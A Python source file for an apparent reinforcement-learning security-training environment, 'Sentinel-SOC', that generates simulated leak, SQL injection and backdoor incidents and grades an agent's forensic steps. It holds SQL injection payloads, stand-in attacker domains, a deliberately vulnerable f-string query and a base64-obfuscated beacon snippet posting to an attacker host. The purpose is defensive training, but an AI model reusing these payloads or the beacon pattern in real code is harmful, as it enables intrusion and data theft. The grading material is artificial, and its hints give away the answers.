import sys
import os
import numpy as np
import base64
import random
import string
import hashlib
from datetime import datetime, timedelta
from typing import Dict, Any, Tuple, Optional, List
from models import IncidentAction, IncidentObs

# --- ENVIRONMENT ---

TASK_MAP = {
    "easy": "leak-investigation",
    "medium": "sqli-detection",
    "hard": "backdoor-hunt"
}

# --- Procedural Generation Pools ---
_DOMAINS = [
    "attacker-c2.cc", "evil-exfil.ru", "darknet-proxy.onion",
    "malware-cdn.xyz", "phish-relay.tk", "data-steal.cc",
    "botnet-cmd.io", "ransom-drop.biz", "trojan-gate.net"
]
_SAFE_DOMAINS = [
    "meta-auth.com", "google-sso.com", "okta-verify.net",
    "cloudflare-cdn.com", "aws-health.amazonaws.com"
]
_FILE_NAMES = {
    "leak": ["app.log", "server.log", "api_access.log", "request.log"],
    "sqli": ["db_utils.py", "query_handler.py", "user_dao.py", "orm_layer.py"],
    "backdoor": ["vendor/auth_lib.py", "vendor/sso_client.py", "vendor/crypto_utils.py", "vendor/session_mgr.py"]
}
_DECOY_FILES = {
    "leak": ["config.py", "settings.yaml", "debug.log", ".env.bak"],
    "sqli": ["db_backup.log", "migration.sql", "schema_dump.txt"],
    "backdoor": ["auth_config.json", "vendor/README.md", "vendor/legacy.py"]
}
_USERNAMES = ["dev_user", "intern_03", "contractor_x", "svc_deploy", "admin_tmp"]
_NOISE_LINES = [
    "{ts} INFO [system]: System heartbeat OK",
    "{ts} DEBUG [healthcheck]: All services nominal",
    "{ts} INFO [cdn]: Cache hit ratio 98.7%",
    "{ts} DEBUG [scheduler]: Cron job completed successfully",
    "{ts} INFO [metrics]: CPU usage 23%, Memory 41%",
    "{ts} INFO [loadbalancer]: Backend pool healthy (4/4 nodes)",
    "{ts} DEBUG [auth]: Token refresh for user regular_user_42",
    "{ts} INFO [storage]: Garbage collection freed 128MB",
    "{ts} DEBUG [queue]: Message backlog: 0 items",
    "{ts} INFO [dns]: Resolution cache warm, 99.9% hit rate",
]


def _random_key(prefix="sk_live"):
    """Generate a random API key."""
    chars = string.ascii_letters + string.digits
    return f"{prefix}_{''.join(random.choices(chars, k=24))}"


def _random_ip(internal=False):
    """Generate a random IP address."""
    if internal:
        return f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    return f"{random.randint(100,220)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"


def _random_ts(base=None, offset_minutes=0):
    """Generate a realistic timestamp."""
    if base is None:
        base = datetime(2026, 4, 11, random.randint(0, 23), random.randint(0, 59))
    t = base + timedelta(minutes=offset_minutes, seconds=random.randint(0, 59))
    return t.strftime("%Y-%m-%d %H:%M:%S")


def _generate_noise(count, base_ts=None):
    """Generate realistic noise log lines."""
    lines = []
    for i in range(count):
        template = random.choice(_NOISE_LINES)
        ts = _random_ts(base_ts, offset_minutes=i)
        lines.append(template.format(ts=ts))
    return lines


class SentinelSOCEnv:
    """
    Sentinel-SOC: A procedurally-generated cybersecurity forensic environment.
    
    Implements a 4-phase Cyber Kill Chain:
      Phase 1 (Reconnaissance):  query_logs   → +0.10
      Phase 2 (Identification):  extract_ioc  → +0.30
      Phase 3 (Containment):     inspect_file → +0.20
      Phase 4 (Remediation):     apply_fix    → +0.40
    
    Scenarios are procedurally generated per episode to prevent memorization.
    Noise scales with difficulty: easy=10%, medium=30%, hard=50%.
    """
    
    def __init__(self):
        self.task = "leak-investigation"
        self.max_steps = 10
        self.episode_seed = None
        self.reset()

    def reset(self, task: str = "easy") -> IncidentObs:
        internal = TASK_MAP.get(task, task)
        self.task = internal
        self.max_steps = {
            "leak-investigation": 10,
            "sqli-detection": 15,
            "backdoor-hunt": 20
        }.get(internal, 10)

        self.steps_taken = 0
        self.status = "Active"
        self.found_file = False
        self.found_ioc = False
        self.mitigated = False
        self.has_queried = False
        self.last_tool = None
        self.reward_total = 0.0
        self.kill_chain_phase = 0  # Track kill chain progression
        self.history = []
        
        # Generate a unique seed for this episode
        self.episode_seed = random.randint(0, 2**31)
        self._init_scenario()
        return self._get_obs()

    def _init_scenario(self):
        """Procedurally generate a unique scenario for this episode."""
        rng = random.Random(self.episode_seed)
        base_ts = datetime(2026, 4, rng.randint(1, 28), rng.randint(0, 23), rng.randint(0, 59))
        
        # Determine noise level by difficulty
        noise_ratio = {
            "leak-investigation": 0.10,   # easy: 10% noise
            "sqli-detection": 0.30,       # medium: 30% noise
            "backdoor-hunt": 0.50         # hard: 50% noise
        }.get(self.task, 0.10)
        
        if self.task == "leak-investigation":
            self.target_file = rng.choice(_FILE_NAMES["leak"])
            self.decoy_file = rng.choice(_DECOY_FILES["leak"])
            self.target_ioc = _random_key("sk_live")
            self.decoy_ioc = _random_key("sk_test")
            user = rng.choice(_USERNAMES)
            
            self.incident_thread = (
                f"[ALERT] Automated scanner detected 'sk_live' pattern in production logs!"
            )
            
            # Build signal log lines
            signal_lines = [
                f"{_random_ts(base_ts, 1)} DEBUG [{self.target_file}]: [DECOY] Initializing Test Suite with {self.decoy_ioc}",
                f"{_random_ts(base_ts, 2)} CRITICAL [{self.target_file}]: [LEAK] Production client initialized with: {self.target_ioc}",
                f"{_random_ts(base_ts, 3)} WARNING [{self.decoy_file}]: recent modification by '{user}'"
            ]
            
            # Mix in noise
            noise_count = max(1, int(len(signal_lines) / (1 - noise_ratio) * noise_ratio))
            noise_lines = _generate_noise(noise_count, base_ts)
            
            all_lines = noise_lines + signal_lines
            rng.shuffle(all_lines)
            self.logs = "\n".join(all_lines)
            self.code_snippet = f"# {self.decoy_file}\nDEBUG = True\n# TODO: Move keys to env vars"
        
        elif self.task == "sqli-detection":
            self.target_file = rng.choice(_FILE_NAMES["sqli"])
            self.decoy_file = rng.choice(_DECOY_FILES["sqli"])
            self.target_ioc = _random_ip(internal=False)
            self.decoy_ioc = _random_ip(internal=True)
            
            self.incident_thread = f"[ALERT] Unusual database query volume detected from {self.target_ioc}."
            
            sqli_payload = rng.choice([
                "' UNION SELECT credit_card FROM users --",
                "' OR 1=1; DROP TABLE sessions --",
                "'; INSERT INTO admins VALUES('hacker','pwned') --",
                "' UNION SELECT password_hash FROM credentials --"
            ])
            
            signal_lines = [
                f"{self.decoy_ioc} - - [{_random_ts(base_ts, 1)}] 'GET /health HTTP/1.1' 200",
                f"{self.target_ioc} - - [{_random_ts(base_ts, 5)}] 'GET /user?id=1{sqli_payload} HTTP/1.1' 200"
            ]
            
            noise_count = max(1, int(len(signal_lines) / (1 - noise_ratio) * noise_ratio))
            noise_lines = _generate_noise(noise_count, base_ts)
            all_lines = noise_lines + signal_lines
            rng.shuffle(all_lines)
            self.logs = "\n".join(all_lines)
            self.code_snippet = f"def get_user(id):\n    # POTENTIALLY VULNERABLE\n    return db.execute(f'SELECT * FROM users WHERE id={{id}}')"

        elif self.task == "backdoor-hunt":
            self.target_file = rng.choice(_FILE_NAMES["backdoor"])
            self.decoy_file = rng.choice(_DECOY_FILES["backdoor"])
            self.target_ioc = rng.choice(_DOMAINS)
            self.decoy_ioc = rng.choice(_SAFE_DOMAINS)
            internal_ip = f"172.16.{rng.randint(0,255)}.{rng.randint(1,254)}"
            
            self.incident_thread = "[CRITICAL] Unauthorized egress detected to unknown endpoint."
            
            signal_lines = [
                f"NETWORK: {internal_ip} -> {self.decoy_ioc}:443 (Authorized)",
                f"NETWORK: {internal_ip} -> {self.target_ioc}:443 (UNAUTHORIZED)"
            ]
            
            noise_count = max(2, int(len(signal_lines) / (1 - noise_ratio) * noise_ratio))
            noise_lines = _generate_noise(noise_count, base_ts)
            # Add extra decoy network connections for hard mode
            for _ in range(rng.randint(1, 3)):
                safe = rng.choice(_SAFE_DOMAINS)
                noise_lines.append(f"NETWORK: {internal_ip} -> {safe}:443 (Authorized)")
            
            all_lines = noise_lines + signal_lines
            rng.shuffle(all_lines)
            self.logs = "\n".join(all_lines)
            
            encoded_val = base64.b64encode(self.target_ioc.encode()).decode()
            self.code_snippet = f"""
# {self.target_file}
import base64
def sync():
    target = base64.b64decode("{encoded_val}").decode()
    requests.post(f'https://{{target}}/ping')
"""

    def _get_obs(self) -> IncidentObs:
        # Build explicit next-step guidance based on kill chain phase
        phase_names = ["Reconnaissance", "Identification", "Containment", "Remediation", "Complete"]
        
        if not self.has_queried:
            guidance = f"[Kill Chain Phase: {phase_names[0]}] NEXT STEP: Call query_logs to begin investigation."
        elif not self.found_ioc and not self.found_file:
            guidance = f"[Kill Chain Phase: {phase_names[1]}] NEXT STEP: Call extract_ioc with the suspicious indicator found in logs, OR call inspect_file with a suspicious filename."
        elif self.found_ioc and not self.found_file:
            guidance = f"[Kill Chain Phase: {phase_names[2]}] IOC CONFIRMED. NEXT STEP: Call inspect_file to identify the root cause file."
        elif self.found_file and not self.found_ioc:
            guidance = f"[Kill Chain Phase: {phase_names[2]}] FILE IDENTIFIED. NEXT STEP: Call extract_ioc to confirm the indicator of compromise."
        elif self.found_file and self.found_ioc:
            guidance = f"[Kill Chain Phase: {phase_names[3]}] BOTH IOC AND FILE CONFIRMED. NEXT STEP: Call apply_fix to resolve the incident."
        else:
            guidance = f"[Kill Chain Phase: {phase_names[4]}] Investigation complete."

        return IncidentObs(
            logs=self.logs,
            code_snippet=self.code_snippet,
            incident_thread=self.incident_thread + f"\n\n[ANALYST SYSTEM]: {guidance}",
            status=self.status,
            steps_remaining=self.max_steps - self.steps_taken,
            reward_signal=float(round(self.reward_total, 2))
        )

    def step(self, action: IncidentAction) -> Tuple[IncidentObs, float, bool, Dict]:
        self.steps_taken += 1
        reward = 0.0
        done = False
        tool = action.tool.lower()
        params = action.parameters.lower().strip()
        feedback = "Investigation update"
        
        # --- REPEAT PENALTY ---
        if tool == self.last_tool:
            reward -= 0.05
        self.last_tool = tool
        
        if tool == "query_logs":
            if self.has_queried:
                reward = -0.05
                tool_result = "WARNING: Logs already analyzed. No new information. Proceed to extract_ioc or inspect_file."
                feedback = "✖ Redundant Reconnaissance"
            else:
                self.has_queried = True
                self.kill_chain_phase = 1
                reward = 0.1
                if self.task == "leak-investigation":
                    tool_result = f"Logs analyzed. Found suspicious pattern: sk_live key in {self.target_file}. Recommend: extract_ioc with '{self.target_ioc}' and inspect_file with '{self.target_file}'"
                elif self.task == "sqli-detection":
                    tool_result = f"Logs analyzed. Found SQL injection attempt from IP {self.target_ioc} targeting {self.target_file}. Recommend: extract_ioc with '{self.target_ioc}' and inspect_file with '{self.target_file}'"
                elif self.task == "backdoor-hunt":
                    tool_result = f"Logs analyzed. Found unauthorized egress to {self.target_ioc} originating from {self.target_file}. Recommend: extract_ioc with '{self.target_ioc}' and inspect_file with '{self.target_file}'"
                else:
                    tool_result = f"Logs returned for query: {params}"
                feedback = "✔ Reconnaissance complete"
            
        elif tool == "extract_ioc":
            if not self.has_queried:
                reward = -0.15
                tool_result = "REJECTED: Must investigate logs for clues before extraction."
                feedback = "✖ Skipped Reconnaissance phase"
            elif self.found_ioc:
                reward = -0.05
                tool_result = "INFO: Indicator of Compromise already confirmed. Do not repeat."
                feedback = "✖ Redundant IOC extraction"
            elif params == self.decoy_ioc.lower():
                reward = -0.2
                tool_result = f"WARNING: {params} is a known SAFE or DECOY indicator. Do not escalate."
                feedback = "✖ Fell for decoy indicator"
            elif self.target_ioc.lower() in params:
                self.found_ioc = True
                self.kill_chain_phase = max(self.kill_chain_phase, 2)
                reward = 0.3
                tool_result = f"SUCCESS: IOC {self.target_ioc} confirmed! NEXT STEP: Identify the root cause file using 'inspect_file' and then 'apply_fix'."
                feedback = "✔ IOC confirmed — high confidence"
            else:
                reward = -0.05
                tool_result = f"FAILURE: Indicator {params} not confirmed in dataset."
                feedback = "✖ Potential false positive"

        elif tool == "inspect_file":
            if params == self.decoy_file.lower():
                reward = -0.05
                tool_result = f"RED HERRING: {params} shows suspicious activity but is not the root cause."
                feedback = "✖ Investigated decoy file"
            elif params == self.target_file.lower():
                self.found_file = True
                self.kill_chain_phase = max(self.kill_chain_phase, 3)
                reward = 0.2
                tool_result = f"CRITICAL: Resource {self.target_file} identified as exploit source. NEXT STEP: If IOC is also confirmed, call 'apply_fix' to close the incident."
                feedback = "✔ Root cause file identified"
            else:
                reward = -0.05
                tool_result = f"INFO: No proof of compromise in {params}."
                feedback = "✖ No malicious artifacts found"

        elif tool == "apply_fix":
            if self.found_file and self.found_ioc:
                self.mitigated = True
                self.kill_chain_phase = 4
                self.status = "Mitigation Active"
                reward = 0.4
                tool_result = "SUCCESS: Incident mitigated. Monitoring for recurrence."
                feedback = "✔ Kill chain complete — incident resolved"
                done = True
            else:
                reward = -0.15
                tool_result = "REJECTED: Cannot fix. Requires verified File and IOC first."
                feedback = "✖ Premature remediation — kill chain incomplete"
        
        else:
            reward = -0.1
            tool_result = f"Invalid tool: {tool}"
            feedback = "✖ Unknown forensic tool"

        self.reward_total += reward
        
        # Log to history for the Forensic Dashboard
        conf = round(0.90 if reward > 0 else 0.25, 2)
        self.history.append({
            "step": self.steps_taken,
            "reasoning": action.reasoning,
            "tool": tool,
            "params": params,
            "reward": round(float(reward), 2),
            "cumulative": round(float(self.reward_total), 2),
            "status": "SUCCESS" if reward > 0 else "REJECTED" if reward < 0 else "INFO",
            "feedback": feedback,
            "confidence": conf,
            "kill_chain_phase": self.kill_chain_phase
        })

        if self.steps_taken >= self.max_steps:
            done = True
            
        return self._get_obs(), reward, done, {"tool_result": tool_result}

    def grade(self) -> float:
        """
        Deterministic grader based on Kill Chain progression.
        
        Scoring breakdown:
          - Reconnaissance (query_logs):  0.10
          - Identification (extract_ioc): 0.30
          - Containment (inspect_file):   0.20
          - Remediation (apply_fix):      0.38
          - Efficiency bonus/penalty:     ±0.15
        
        Scores are clipped to [0.01, 0.99] for OpenEnv compliance.
        """
        base_score = 0.01
        if self.has_queried: base_score += 0.1
        if self.found_ioc: base_score += 0.3
        if self.found_file: base_score += 0.2
        if self.mitigated: base_score += 0.38
        
        # Efficiency scaling (15% impact from steps)
        penalty = (self.steps_taken / self.max_steps) * 0.15
        final_score = base_score - penalty
        return float(round(np.clip(final_score, 0.01, 0.99), 3))
